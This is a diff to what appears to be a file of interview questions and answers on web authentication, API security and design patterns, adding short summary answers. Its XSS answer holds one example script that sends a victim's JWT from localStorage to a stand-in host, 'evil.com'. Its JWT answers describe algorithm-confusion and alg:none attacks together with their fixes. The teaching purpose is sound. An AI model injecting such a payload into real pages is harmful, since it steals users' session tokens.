+        a: `<div class="interview-answer"><p>A JWT is three base64url parts separated by dots: header, payload, and signature. The header names the signing algorithm, the payload carries claims like <code>sub</code>, <code>exp</code>, and roles, and the signature makes it tamper-proof — computed over the first two parts with a secret or private key. The single most important thing to say is that the payload is only encoded, not encrypted — anyone can read it — so you never put secrets in it, and the signature only proves integrity, not confidentiality. The whole security model rests on verifying that signature server-side; skip it and a JWT is just attacker-editable JSON.</p></div>
+<p><strong>JWT (JSON Web Token)</strong> is a compact, URL-safe token format for securely transmitting claims between parties.</p>
 <pre>// JWT structure: header.payload.signature
 eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOjEyM30.SflKxwRJSMeKKF2QT4fwpM
 
@@ -1697,7 +1759,8 @@ Signature: HMACSHA256(base64(header) + "." + base64(payload), secret)</pre>
       {
         q: 'What is the difference between access tokens and refresh tokens?',
         difficulty: 'medium',
-        a: `<ul>
+        a: `<div class="interview-answer"><p>The split exists to balance security against usability. The access token is short-lived (minutes) and sent on every API call, so if it leaks the blast radius is small; the refresh token is long-lived and used only against the auth server to mint new access tokens, so it's exposed far less and can be stored more carefully. That way you're not sending your most powerful credential on every request, and you gain a revocation point — invalidate the refresh token to cut off future access without tracking every access token. Best practice adds refresh-token rotation with reuse detection. The gotcha is treating a long-lived access token as good enough — you lose both the small blast radius and any real revocation story.</p></div>
+<ul>
 <li><strong>Access token</strong>: short-lived (5-30 min), sent with every API request, used for authorization.</li>
 <li><strong>Refresh token</strong>: long-lived (days-weeks), used ONLY to get new access tokens, stored more securely.</li>
 </ul>
@@ -1723,7 +1786,8 @@ Signature: HMACSHA256(base64(header) + "." + base64(payload), secret)</pre>
       {
         q: 'Where should JWT be stored in the browser?',
         difficulty: 'hard',
-        a: `<table style="width:100%;border-collapse:collapse;margin:10px 0;font-size:.88rem;">
+        a: `<div class="interview-answer"><p>My honest answer is to prefer an <code>HttpOnly</code>, <code>Secure</code>, <code>SameSite</code> cookie over localStorage. localStorage is readable by any JavaScript, so a single XSS anywhere on the page steals the token — and XSS is common. An HttpOnly cookie is invisible to JS, which closes the XSS-exfiltration door, at the price of opening CSRF exposure — but CSRF is well understood and cheap to stop with SameSite plus anti-CSRF tokens. So the real tradeoff is XSS risk vs CSRF risk, and CSRF is the easier of the two to defend. The deeper point is that if you have XSS no storage location is truly safe, so token storage is a mitigation, not a substitute for output encoding and a strong CSP.</p></div>
+<table style="width:100%;border-collapse:collapse;margin:10px 0;font-size:.88rem;">
 <tr><th style="text-align:left;padding:6px;border-bottom:1px solid #ccc;">Storage</th><th style="padding:6px;border-bottom:1px solid #ccc;">XSS Risk</th><th style="padding:6px;border-bottom:1px solid #ccc;">CSRF Risk</th><th style="padding:6px;border-bottom:1px solid #ccc;">Survives Refresh</th></tr>
 <tr><td style="padding:6px;">localStorage</td><td style="padding:6px;">❌ High (JS accessible)</td><td style="padding:6px;">✅ None</td><td style="padding:6px;">✅ Yes</td></tr>
 <tr><td style="padding:6px;">HttpOnly Cookie</td><td style="padding:6px;">✅ Safe (JS can't read)</td><td style="padding:6px;">❌ Needs SameSite/CSRF token</td><td style="padding:6px;">✅ Yes</td></tr>
@@ -1745,7 +1809,8 @@ Set-Cookie: refreshToken=xyz;
       {
         q: 'How do you validate JWT securely on the backend?',
         difficulty: 'hard',
-        a: `<pre>// JWT validation checklist:
+        a: `<div class="interview-answer"><p>Verifying a JWT is more than "does the signature match." The infamous vulnerability is trusting the token's own <code>alg</code> header — an attacker sets it to <code>none</code>, or swaps RS256 for HS256 and signs with your public key as the HMAC secret. So I pin the expected algorithm server-side instead of reading it from the token. Then verify the signature with the correct key and validate the standard claims: <code>exp</code>, <code>nbf</code>/<code>iat</code>, plus <code>iss</code> and <code>aud</code> so a token minted for another service can't be replayed at yours. With rotating keys I resolve the key by <code>kid</code> against the provider's JWKS. And never trust any claim before the signature checks out.</p></div>
+<pre>// JWT validation checklist:
 1. Verify SIGNATURE with the correct key/secret
 2. Check EXPIRATION (exp claim) — reject expired tokens
 3. Check NOT-BEFORE (nbf claim) — reject if before activation
@@ -1777,7 +1842,8 @@ Claims claims = Jwts.parserBuilder()
       {
         q: 'What are common JWT security vulnerabilities?',
         difficulty: 'hard',
-        a: `<ol>
+        a: `<div class="interview-answer"><p>The classics all come from trusting the token too much. Number one is the algorithm-confusion and <code>alg: none</code> attack — never let the token dictate its own verification algorithm, pin it server-side. Second, weak or hardcoded HMAC secrets that are brute-forceable — use strong keys or asymmetric signing. Third, no revocation: you can't easily kill a JWT before it expires, so long-lived tokens are dangerous — keep them short and add a denylist or refresh-token rotation. Fourth, storing them where XSS can grab them, and putting sensitive data in the always-readable payload. And missing <code>aud</code>/<code>iss</code> checks let a token be replayed across services. The theme is: validate everything server-side, keep lifetimes short, and never confuse encoding with encryption.</p></div>
+<ol>
 <li><strong>Algorithm confusion</strong>: Attacker changes RS256→HS256, uses public key as HMAC secret. Fix: whitelist algorithms.</li>
 <li><strong>Weak signing secret</strong>: Short secrets can be brute-forced. Fix: use 256+ bit random secrets or asymmetric keys.</li>
 <li><strong>Long token lifetime</strong>: Stolen tokens valid for hours/days. Fix: short-lived access tokens (5-15 min).</li>
@@ -1796,7 +1862,8 @@ Claims claims = Jwts.parserBuilder()
       {
         q: 'How do you handle logout or revocation with JWT?',
         difficulty: 'hard',
-        a: `<p>JWT is stateless by design — there's no built-in way to invalidate a token before it expires. Here are strategies:</p>
+        a: `<div class="interview-answer"><p>This is JWT's Achilles heel: because validation is stateless and offline, there's no built-in way to revoke a token before it expires — logout on the client just deletes the token, but a stolen copy still works until <code>exp</code>. So you pick a strategy. The pragmatic one is short-lived access tokens plus a revocable refresh token: logout invalidates the refresh token and access dies quickly on its own. For immediate revocation you keep a server-side denylist keyed by <code>jti</code>, checked on each request — but that reintroduces the stateful lookup JWT was meant to avoid. The honest take: if you need instant, reliable revocation, JWTs are fighting you and a server-side session may be the better tool.</p></div>
+<p>JWT is stateless by design — there's no built-in way to invalidate a token before it expires. Here are strategies:</p>
 <pre>// Strategy 1: Short-lived access tokens (simplest)
 Access token: 5-15 minutes
 → After logout, token expires quickly on its own
@@ -1827,7 +1894,8 @@ On logout: increment tokenVersion to 6
       {
         q: 'What is the difference between OAuth 2.0 and JWT?',
         difficulty: 'medium',
-        a: `<ul>
+        a: `<div class="interview-answer"><p>This is a category error dressed up as a comparison: OAuth 2.0 is an authorization framework — a set of flows for granting delegated access — while a JWT is just a token format, a signed JSON container. They're not alternatives, they compose. OAuth defines how a client obtains a token; JWT is one popular format that token can take, since OAuth access tokens can equally be opaque random strings the auth server looks up. So you often use both: run the OAuth authorization-code flow and receive a JWT access token. The mistake is thinking you choose one over the other, or that using JWTs means you've implemented OAuth — you haven't.</p></div>
+<ul>
 <li><strong>OAuth 2.0</strong>: an <strong>authorization framework</strong> that defines flows for granting access. It specifies WHO can access WHAT.</li>
 <li><strong>JWT</strong>: a <strong>token format</strong> that encodes claims as JSON. It's a container, not a protocol.</li>
 </ul>
@@ -1848,7 +1916,8 @@ Resource Server → validates JWT without calling auth server</pre>
       {
         q: 'What is OpenID Connect and how is it related to OAuth 2.0?',
         difficulty: 'medium',
-        a: `<p><strong>OpenID Connect (OIDC)</strong> is an identity layer built ON TOP of OAuth 2.0.</p>
+        a: `<div class="interview-answer"><p>OIDC is the thin identity layer OAuth was missing. OAuth 2.0 only answers "is this app authorized to access these resources" — it deliberately says nothing about who the user is, and people dangerously bolted authentication onto it anyway. OIDC standardizes that: on top of the OAuth flow it adds an <code>id_token</code> (a JWT with standard identity claims like <code>sub</code>, <code>email</code>, <code>iss</code>, <code>aud</code>) and a userinfo endpoint. So the model is OAuth for authorization via the access token, OIDC for authentication via the ID token. It's what "Sign in with Google" actually uses. The gotcha is confusing the two tokens — the access token calls APIs, the ID token proves who logged in and shouldn't be sent to resource APIs.</p></div>
+<p><strong>OpenID Connect (OIDC)</strong> is an identity layer built ON TOP of OAuth 2.0.</p>
 <pre>OAuth 2.0 alone:
   "This app can access your Google Drive photos"
   → Authorization (access to resources)
@@ -1881,7 +1950,8 @@ OIDC adds:
       {
         q: 'What is the difference between RBAC and ABAC?',
         difficulty: 'medium',
-        a: `<ul>
+        a: `<div class="interview-answer"><p>RBAC grants permissions through roles — admin, editor, viewer — and it's simple, auditable, and enough for most apps; ABAC decides per request by evaluating attributes of the user, resource, action, and environment, like ownership, department, time, or IP. The tradeoff is expressiveness vs complexity: RBAC is easy to reason about but suffers role explosion when you need fine-grained or contextual rules, while ABAC handles those elegantly but is harder to author, test, and audit. In practice I start with RBAC and layer attribute checks onto the cases roles can't express — most real systems are hybrid. The gotcha with ABAC is that a complex policy engine becomes its own correctness and performance risk.</p></div>
+<ul>
 <li><strong>RBAC (Role-Based Access Control)</strong>: permissions granted based on user's role.</li>
 <li><strong>ABAC (Attribute-Based Access Control)</strong>: permissions based on attributes of user, resource, environment.</li>
 </ul>
@@ -1911,7 +1981,8 @@ ALLOW if:
       {
         q: 'What is the difference between CORS and CSRF?',
         difficulty: 'medium',
-        a: `<p>Two completely different security concepts that are often confused:</p>
+        a: `<div class="interview-answer"><p>They sound alike but are nearly opposites. CORS is a browser mechanism that relaxes the same-origin policy — a server saying "these other origins may read my responses" — so it's about permitting cross-origin reads, not a defense. CSRF is an attack where a malicious site rides your logged-in cookies to make a state-changing request you didn't intend. The common misconception is that CORS prevents CSRF; it doesn't — CORS governs reading responses, while CSRF abuses the request being sent with your credentials. You stop CSRF with <code>SameSite</code> cookies, anti-CSRF tokens, and checking Origin/Referer. And loosening CORS to <code>*</code> just to clear an error is how people accidentally open real holes.</p></div>
+<p>Two completely different security concepts that are often confused:</p>
 <ul>
 <li><strong>CORS (Cross-Origin Resource Sharing)</strong>: A browser security <strong>mechanism</strong> that controls which origins can make requests to your API.</li>
 <li><strong>CSRF (Cross-Site Request Forgery)</strong>: An <strong>attack</strong> where a malicious site tricks a user's browser into making unwanted requests to your API.</li>
@@ -1941,7 +2012,8 @@ Access-Control-Allow-Headers: Authorization, Content-Type
       {
         q: 'What is XSS and why does it matter for token-based auth?',
         difficulty: 'hard',
-        a: `<p><strong>XSS (Cross-Site Scripting)</strong>: An attacker injects malicious JavaScript that runs in your page with full access to everything the page can access.</p>
+        a: `<div class="interview-answer"><p>XSS is when an attacker gets their JavaScript to run in your page's origin, which means it can do anything your code can — read the DOM, make authenticated requests, and steal any token reachable from JS. That's the argument against localStorage for tokens: XSS drains it instantly, whereas an HttpOnly cookie is at least invisible to script. Note that XSS still beats HttpOnly cookies indirectly, because the script can just make requests as the user. The real fix is prevention, not storage tricks: contextual output encoding, treating all input as untrusted, a strict Content-Security-Policy, and framework auto-escaping. Stored, reflected, and DOM-based XSS all reduce to the same root — untrusted data reaching an execution sink.</p></div>
+<p><strong>XSS (Cross-Site Scripting)</strong>: An attacker injects malicious JavaScript that runs in your page with full access to everything the page can access.</p>
 <pre>// Three types:
 1. Stored XSS: malicious script saved in DB, served to all users
    Comment: &lt;script&gt;fetch('evil.com?token='+localStorage.getItem('jwt'))&lt;/script&gt;
@@ -1971,7 +2043,8 @@ document.cookie  // can't read HttpOnly cookies ✅
       {
         q: 'What is mTLS and when would you use it between services?',
         difficulty: 'hard',
-        a: `<p><strong>mTLS (Mutual TLS)</strong> means both client and server verify each other's identity using certificates — not just the server (regular TLS).</p>
+        a: `<div class="interview-answer"><p>Regular TLS authenticates only the server; mTLS makes both sides present certificates, so the server also cryptographically verifies the client. In microservices that gives strong service-to-service identity and wire encryption without passing shared secrets around — service A knows it's really talking to service B, which underpins zero-trust networking. The natural place is internal east-west traffic, usually terminated automatically by a service mesh so app code never touches certs. The operational catch is certificate lifecycle — issuance, rotation, revocation at scale — which is exactly why you lean on a mesh or SPIFFE/SPIRE rather than hand-rolling it. It's overkill for public user traffic, where OAuth tokens fit better.</p></div>
+<p><strong>mTLS (Mutual TLS)</strong> means both client and server verify each other's identity using certificates — not just the server (regular TLS).</p>
 <pre>Regular TLS (HTTPS):
   Client → verifies server certificate → encrypted connection
   Server doesn't verify client identity
@@ -2001,7 +2074,8 @@ mTLS:
       {
         q: 'What is the difference between symmetric and asymmetric JWT signing?',
         difficulty: 'hard',
-        a: `<table style="width:100%;border-collapse:collapse;margin:10px 0;font-size:.88rem;">
+        a: `<div class="interview-answer"><p>Symmetric (HS256) signs and verifies with one shared secret; asymmetric (RS256, ES256) signs with a private key and verifies with a public key. The deciding factor is who needs to verify: if the same service issues and validates, HS256 is simpler and faster. But the moment multiple services — or third parties — must verify tokens, asymmetric wins decisively, because you hand out the public key freely while only the auth server holds the private key, so a compromised verifier can't mint tokens. It's also what enables JWKS and key rotation by <code>kid</code>. The classic pitfall is the algorithm-confusion attack when you accept both: an attacker signs an HS256 token using your public key as the secret, so always pin the algorithm.</p></div>
+<table style="width:100%;border-collapse:collapse;margin:10px 0;font-size:.88rem;">
 <tr><th style="text-align:left;padding:6px;border-bottom:1px solid #ccc;">Aspect</th><th style="padding:6px;border-bottom:1px solid #ccc;">Symmetric (HS256)</th><th style="padding:6px;border-bottom:1px solid #ccc;">Asymmetric (RS256)</th></tr>
 <tr><td style="padding:6px;">Keys</td><td style="padding:6px;">One shared secret</td><td style="padding:6px;">Private key + Public key</td></tr>
 <tr><td style="padding:6px;">Sign</td><td style="padding:6px;">Same secret</td><td style="padding:6px;">Private key (auth server only)</td></tr>
@@ -2025,7 +2099,8 @@ GET https://auth.myapp.com/.well-known/jwks.json
       {
         q: 'How do you protect login endpoints from brute-force attacks?',
         difficulty: 'medium',
-        a: `<p>Login endpoints are prime targets for brute-force and credential stuffing attacks.</p>
+        a: `<div class="interview-answer"><p>I defend in layers, because no single control is enough. Rate limiting and progressive delays or lockouts slow password guessing, but keyed carefully — per-account plus per-IP, since credential stuffing spreads attempts across many accounts and IPs to dodge per-account limits. A CAPTCHA after a few failures raises the cost for bots. The biggest structural win is not relying on passwords alone: MFA, plus checking credentials against known-breach lists to block stuffing outright. Passwords must be stored with a slow hash like bcrypt or Argon2 so a leak isn't instantly crackable, and I return a generic "invalid credentials" so I don't leak which accounts exist. The gotcha is account lockout becoming a denial-of-service vector against legitimate users.</p></div>
+<p>Login endpoints are prime targets for brute-force and credential stuffing attacks.</p>
 <p><strong>Defense layers:</strong></p>
 <ul>
 <li><strong>Rate limiting</strong>: Max 5 attempts per account per 15 minutes</li>
@@ -2055,7 +2130,8 @@ String hash = BCrypt.hashpw(password, BCrypt.gensalt(12));
       {
         q: 'How does refresh token rotation with reuse detection work?',
         difficulty: 'tricky',
-        a: `<p><strong>Refresh token rotation</strong> means every refresh token is <strong>one-time use</strong>: each time the client refreshes, the server issues a NEW refresh token and invalidates the old one. The senior-level part is <strong>reuse detection</strong> — what happens when an already-used token shows up again.</p>
+        a: `<div class="interview-answer"><p>Rotation makes every refresh token single-use: each refresh returns a new refresh token and invalidates the old one. The clever part is reuse detection — because tokens are one-time, if an already-used old token shows up again that's a strong signal it was stolen and someone is replaying a consumed token. The response is to revoke the entire token family/session and force re-authentication, which caps how long a stolen refresh token stays useful. You track this with a token-family ID and a used/rotated flag server-side. The gotcha is false positives from races — a network retry or two tabs refreshing at once can look like reuse — so you need a small grace window or careful client handling to avoid logging honest users out.</p></div>
+<p><strong>Refresh token rotation</strong> means every refresh token is <strong>one-time use</strong>: each time the client refreshes, the server issues a NEW refresh token and invalidates the old one. The senior-level part is <strong>reuse detection</strong> — what happens when an already-used token shows up again.</p>
 <pre>// Normal flow (rotation):
 Client                        Server
   |-- POST /refresh (RT1) -->  |  RT1 valid → mark RT1 used
@@ -2095,7 +2171,8 @@ async function refresh(token) {
       {
         q: 'Why should you NOT use JWT for user sessions? When does JWT actually win?',
         difficulty: 'tricky',
-        a: `<p>This contrarian question separates seniors from tutorial-followers. JWT is often the <strong>wrong</strong> tool for classic browser sessions:</p>
+        a: `<div class="interview-answer"><p>For classic browser sessions a plain server-side session — a random opaque ID in an HttpOnly cookie, state in Redis — is usually the better choice, and reaching for JWT by default is a common junior mistake. Sessions are trivially revocable (delete the row), you can update permissions instantly, the cookie is tiny, and you're not shipping readable, hard-to-invalidate user data around. JWT's headline benefit, stateless with no lookup, is exactly what makes revocation and logout painful, and most apps hit Redis every request anyway. Where JWT genuinely wins is stateless cross-service or third-party authorization, mobile and API clients, and federated SSO — cases where a central session store is a bottleneck or the verifier isn't the issuer. Match the tool to that, not to hype.</p></div>
+<p>This contrarian question separates seniors from tutorial-followers. JWT is often the <strong>wrong</strong> tool for classic browser sessions:</p>
 <ul>
 <li><strong>You can't revoke it</strong>: logout, password change, "ban this user now" — the token stays valid until <code>exp</code>. Every fix (blacklist in Redis, token versioning) reintroduces the server-side state JWT was supposed to eliminate.</li>
 <li><strong>Payload bloat</strong>: roles, permissions, profile data get stuffed in; the token is sent on EVERY request. A 4 KB JWT vs a 32-byte session ID on every call adds up.</li>
@@ -2125,7 +2202,8 @@ const session = await redis.get('sess:' + sessionId);
       {
         q: 'What is IDOR (Insecure Direct Object Reference) and how do you prevent it?',
         difficulty: 'hard',
-        a: `<p><strong>IDOR</strong> is when an application exposes a direct reference to an internal object (an ID) and fails to check that the <em>authenticated</em> user is <em>authorized</em> for that specific object. It has topped the OWASP list (as Broken Access Control) for years because it's trivially easy to introduce.</p>
+        a: `<div class="interview-answer"><p>IDOR is broken access control at the object level: you expose an object reference like an ID and then forget to check that the authenticated user is authorized for that specific object — so changing <code>/invoice/123</code> to <code>124</code> returns someone else's invoice. It's topped the OWASP list for years because it's trivially easy to introduce: authentication passes, so people assume authorization did too. The fix is an ownership/authorization check on every object access, server-side, scoped to the current user — never trust the ID from the client. Unguessable UUIDs are defense in depth, not a fix, since it's still a missing check. The real discipline is centralizing that check so nobody forgets it on a new endpoint.</p></div>
+<p><strong>IDOR</strong> is when an application exposes a direct reference to an internal object (an ID) and fails to check that the <em>authenticated</em> user is <em>authorized</em> for that specific object. It has topped the OWASP list (as Broken Access Control) for years because it's trivially easy to introduce.</p>
 <pre>// The attack — no tools needed, just curiosity:
 GET /api/orders/123   → my order. Logged in, token valid. 200 OK
 GET /api/orders/124   → someone ELSE's order... also 200 OK!
@@ -2167,7 +2245,8 @@ class OrderRepository {
       {
         q: 'How do you store and manage application secrets properly?',
         difficulty: 'hard',
-        a: `<p>Secrets (DB passwords, API keys, signing keys) leak through predictable paths, and each naive storage level fails differently:</p>
+        a: `<div class="interview-answer"><p>The core principle is that secrets never live in code or the repo — that's how they end up in Git history and leaked forever. The progression: hardcoded is worst; env vars and config files are better but still sit in plaintext on disk and leak via logs and process dumps; the right answer is a dedicated secrets manager (Vault, AWS Secrets Manager) that stores them encrypted, gates access by policy, audits reads, and supports rotation. Beyond storage, what matters is automatic rotation, short-lived dynamic credentials, and encryption in transit and at rest. In Kubernetes, native Secrets are only base64 by default, so you back them with a real KMS. And you scan commits so a leaked key is caught and rotated immediately.</p></div>
+<p>Secrets (DB passwords, API keys, signing keys) leak through predictable paths, and each naive storage level fails differently:</p>
 <ul>
 <li><strong>Hardcoded in source</strong>: lives forever in git history — rotating the secret doesn't scrub old commits; one leaked repo leaks everything.</li>
 <li><strong>.env files</strong>: fine locally, but they get committed by accident, copied to laptops, and pasted into Slack. No audit trail, no rotation.</li>
@@ -2216,7 +2295,8 @@ const { password } = JSON.parse(res.SecretString);</pre>
       {
         q: 'What is a design pattern and why does it matter?',
         difficulty: 'easy',
-        a: `<p>A <strong>design pattern</strong> is a reusable solution to a recurring design problem.</p>
+        a: `<div class="interview-answer"><p>A design pattern is a named, reusable solution to a recurring design problem — and the emphasis I put on it is that patterns are shared vocabulary as much as solutions. Saying "let's use a Strategy here" communicates a whole design in two words to anyone who knows the catalog. But the senior caveat is that patterns are tools, not goals: each one buys flexibility by adding indirection, and indirection costs readability, so applying them speculatively (pattern-itis) makes code worse. I reach for a pattern when a real force — change, variation, coupling — actually shows up, not preemptively. Knowing when NOT to use one is the mark of maturity.</p></div>
+<p>A <strong>design pattern</strong> is a reusable solution to a recurring design problem.</p>
 <ul>
 <li>It gives a shared vocabulary.</li>
 <li>It improves maintainability when used appropriately.</li>
@@ -2243,7 +2323,8 @@ class SmsSender implements NotificationSender {
       {
         q: 'What is the Singleton pattern and what are its risks?',
         difficulty: 'medium',
-        a: `<p><strong>Singleton</strong> ensures only one instance of a class exists.</p>
+        a: `<div class="interview-answer"><p>Singleton guarantees one instance with a global access point, and it's the pattern I'm most suspicious of. The mechanics have real gotchas — thread safety on lazy init (double-checked locking with <code>volatile</code>, or better, an enum or holder idiom in Java) and being broken via reflection or serialization. But the deeper problem is design: a singleton is global mutable state, which hides dependencies, couples everything to a concrete class, and makes unit testing painful because you can't substitute it. So my take is that most singletons should just be a single instance managed by your DI container and injected as a dependency — you get "one instance" without the global-access baggage.</p></div>
+<p><strong>Singleton</strong> ensures only one instance of a class exists.</p>
 <ul>
 <li>Useful for shared configuration or one-off coordinators.</li>
 <li>Risks: hidden global state, hard testing, tight coupling.</li>
@@ -2266,7 +2347,8 @@ String env = AppConfig.INSTANCE.getEnv();</pre>
       {
         q: 'What is the Factory Method pattern?',
         difficulty: 'medium',
-        a: `<p><strong>Factory Method</strong> delegates object creation to a method instead of calling constructors directly everywhere.</p>
+        a: `<div class="interview-answer"><p>Factory Method moves object creation behind a method, often overridden by subclasses, so callers depend on an interface rather than a concrete class — you can swap or extend what's created without touching client code, which is Open/Closed in action. I use it when the exact type to instantiate depends on context or subclass, or when I want to centralize and name creation logic that a bare <code>new</code> can't express, and it also helps testing. The thing to keep straight is scope: Factory Method creates one product via inheritance, whereas Abstract Factory creates families of related products via composition — people blur the two constantly.</p></div>
+<p><strong>Factory Method</strong> delegates object creation to a method instead of calling constructors directly everywhere.</p>
 <pre>interface PaymentGateway {
     void pay(int amount);
 }
@@ -2295,7 +2377,8 @@ class PaymentGatewayFactory {
       {
         q: 'What is the difference between Factory Method and Abstract Factory?',
         difficulty: 'medium',
-        a: `<ul>
+        a: `<div class="interview-answer"><p>Both hide construction behind an abstraction, but at different scopes and via different mechanisms. Factory Method is about one product and uses inheritance — a subclass overrides the creator method to decide the concrete type. Abstract Factory is about a family of related products and uses composition — you inject a factory object whose methods produce a matched set, like a WindowsButton and WindowsCheckbox versus the Mac equivalents, guaranteeing consistency. My rule of thumb: reach for Abstract Factory when multiple product types must vary together as a set, and Factory Method when it's a single product whose type varies. In practice an Abstract Factory's methods are often themselves Factory Methods, which is why people conflate them.</p></div>
+<ul>
 <li><strong>Factory Method</strong>: creates one product type.</li>
 <li><strong>Abstract Factory</strong>: creates a family of related products.</li>
 </ul>
@@ -2329,7 +2412,8 @@ class LightUiFactory implements UiFactory {
       {
         q: 'What is the Builder pattern and why is it useful?',
         difficulty: 'easy',
-        a: `<p><strong>Builder</strong> constructs complex objects step by step.</p>
+        a: `<div class="interview-answer"><p>Builder is my go-to when a constructor has too many parameters, especially optional ones — it kills the telescoping-constructor mess and the unreadable <code>new Thing(null, null, true, null)</code> call sites. You get named, fluent, self-documenting construction, can enforce validation in <code>build()</code>, and it pairs beautifully with immutability: assemble step by step, then produce a final immutable object. In Java the Effective-Java static-nested Builder is the canonical form. I'd use it over setters precisely because setters leave objects mutable and half-constructed. The gotcha is applying it to simple objects where it's pure ceremony — a two-field class doesn't need a builder.</p></div>
+<p><strong>Builder</strong> constructs complex objects step by step.</p>
 <ul>
 <li>Improves readability.</li>
 <li>Avoids long constructors with many optional arguments.</li>
@@ -2368,7 +2452,8 @@ User user = new User.Builder()
       {
         q: 'What is the Strategy pattern and when do you use it?',
         difficulty: 'easy',
-        a: `<p><strong>Strategy</strong> encapsulates interchangeable algorithms behind a common interface.</p>
+        a: `<div class="interview-answer"><p>Strategy captures a family of interchangeable algorithms behind one interface and lets you pick or swap them at runtime — think payment methods, sorting comparators, or pricing rules. Its real value is killing big <code>if/else</code> or <code>switch</code> chains on a type code: each branch becomes a strategy class, so adding a behavior is a new class rather than an edit to existing code (Open/Closed), and each algorithm is independently testable. In modern languages a strategy is often just a lambda or function you pass in, so you don't always need a formal hierarchy. The distinction to hold onto is Strategy vs State: same structure, but a Strategy is chosen by the client while a State transitions itself based on lifecycle.</p></div>
+<p><strong>Strategy</strong> encapsulates interchangeable algorithms behind a common interface.</p>
 <pre>interface DiscountStrategy {
     double apply(double price);
 }
@@ -2397,7 +2482,8 @@ class CheckoutService {
       {
         q: 'What is the difference between Strategy and State?',
         difficulty: 'hard',
-        a: `<ul>
+        a: `<div class="interview-answer"><p>Structurally they're near-identical — an object delegating to a swappable behavior interface — so interviewers use the difference to test whether you understand intent, not UML. Strategy is about choosing one of several interchangeable algorithms, and the client picks it; the strategies don't know about each other or change themselves. State is about an object behaving differently depending on its current lifecycle state, and crucially the states drive their own transitions — one state hands control to the next, like a document going draft to review to published. So the tell is: is the behavior selected once from outside (Strategy), or does it evolve as part of an internal state machine where behaviors know their successors (State)?</p></div>
+<ul>
 <li><strong>Strategy</strong>: choose one behavior among alternatives.</li>
 <li><strong>State</strong>: behavior changes based on current lifecycle state.</li>
 </ul>
@@ -2431,7 +2517,8 @@ class Order {
       {
         q: 'What is the Observer pattern?',
         difficulty: 'easy',
-        a: `<p><strong>Observer</strong> defines a one-to-many dependency so observers are notified when subject state changes.</p>
+        a: `<div class="interview-answer"><p>Observer sets up a one-to-many notification: a subject keeps a list of observers and pushes updates when its state changes, so dependents stay in sync without the subject knowing their concrete types — loose coupling. It's the backbone of event listeners, UI data binding, and reactive frameworks; RxJS and the reactive-streams world are Observer scaled up. The gotchas I watch for are memory leaks from observers that never unsubscribe (the lapsed-listener problem), surprising update cascades and ordering issues, and doing heavy work synchronously in the notification. The distinction to draw is Observer — in-process, subject holds direct references — versus Pub/Sub, where a broker decouples publishers and subscribers entirely.</p></div>
+<p><strong>Observer</strong> defines a one-to-many dependency so observers are notified when subject state changes.</p>
 <pre>interface Observer {
     void update(String event);
 }
@@ -2460,7 +2547,8 @@ class OrderSubject {
       {
         q: 'What is the difference between Observer and Pub/Sub?',
         difficulty: 'medium',
-        a: `<ul>
+        a: `<div class="interview-answer"><p>Same idea — notify interested parties on an event — but different coupling and scope. Observer is an in-process pattern where the subject holds direct references to its observers and calls them; they know about each other, it's synchronous, and it lives inside one application. Pub/Sub introduces a broker in the middle: publishers emit to a topic and subscribers listen on it, the two never know about each other, and it typically works across processes or machines, asynchronously. So the rule of thumb is Observer for in-memory event notification within an app, Pub/Sub for distributed, decoupled messaging between services. The tradeoff Pub/Sub adds is broker infrastructure, delivery guarantees, and eventual consistency.</p></div>
+<ul>
 <li><strong>Observer</strong>: in-process object pattern.</li>
 <li><strong>Pub/Sub</strong>: distributed messaging architecture using a broker.</li>
 </ul>
@@ -2482,7 +2570,8 @@ new EventBus().publish("orders", "OrderShipped");</pre>
       {
         q: 'What is the Adapter pattern?',
         difficulty: 'medium',
-        a: `<p><strong>Adapter</strong> converts one interface into another interface expected by the client.</p>
+        a: `<div class="interview-answer"><p>Adapter is the plug converter: it wraps an existing class and translates its interface into the one your client expects, so two incompatible things work together without changing either. I reach for it constantly when integrating third-party or legacy code — wrap the vendor SDK behind your own interface, which also gives you a seam to mock in tests and one place to swap vendors. The key point about intent: Adapter changes an interface without changing behavior, Decorator keeps the interface but adds behavior, and Facade simplifies a whole subsystem. It's structural glue, so the only real gotcha is a leaky adapter that lets the adaptee's quirks bleed through.</p></div>
+<p><strong>Adapter</strong> converts one interface into another interface expected by the client.</p>
 <pre>class LegacyPaymentApi {
     void makePayment(int cents) {
         System.out.println("Legacy paid: " + cents);
@@ -2505,7 +2594,8 @@ class PaymentAdapter implements PaymentProcessor {
       {
         q: 'What is the Facade pattern?',
         difficulty: 'medium',
-        a: `<p><strong>Facade</strong> provides a simplified interface over a complex subsystem.</p>
+        a: `<div class="interview-answer"><p>Facade gives you one simple front door to a complex subsystem — the client calls a couple of clean methods instead of orchestrating a dozen collaborating classes. The value is reduced coupling: clients depend on the facade, not the internals, so you can refactor behind it freely, and it's a natural boundary between layers or around a messy library. The distinction I keep straight: Facade simplifies and can front many objects but doesn't hide them (you can still reach past it), Adapter converts one interface to another, and Proxy keeps the same interface to control access. The anti-pattern is a god-facade that accretes every operation in the system into one bloated class.</p></div>
+<p><strong>Facade</strong> provides a simplified interface over a complex subsystem.</p>
 <pre>class InventoryService {
     void reserve(String item) { System.out.println("Reserved " + item); }
 }
@@ -2534,7 +2624,8 @@ class CheckoutFacade {
       {
         q: 'What is the Proxy pattern?',
         difficulty: 'medium',
-        a: `<p><strong>Proxy</strong> keeps the same interface as the real object but controls access to it.</p>
+        a: `<div class="interview-answer"><p>Proxy stands in for the real object with the identical interface, so the client can't tell the difference, and it interposes to control access — that's the point. The flavors map to real uses: virtual proxy for lazy or expensive initialization (Hibernate lazy loading), protection proxy for access control, remote proxy for network calls (RPC stubs), and caching or logging proxies for cross-cutting concerns. It's essentially how AOP and Spring's transactional and security proxies work under the hood. Versus its siblings: Proxy keeps the same interface and controls access, Decorator keeps the interface but adds behavior, Adapter changes the interface. The gotcha is a proxy that silently changes performance — a lazy proxy triggering surprise queries, for instance.</p></div>
+<p><strong>Proxy</strong> keeps the same interface as the real object but controls access to it.</p>
 <ul>
 <li>Lazy loading</li>
 <li>Security checks</li>
@@ -2576,7 +2667,8 @@ class ImageProxy implements Image {
       {
         q: 'What is the Decorator pattern?',
         difficulty: 'medium',
-        a: `<p><strong>Decorator</strong> adds behavior to an object without changing its class.</p>
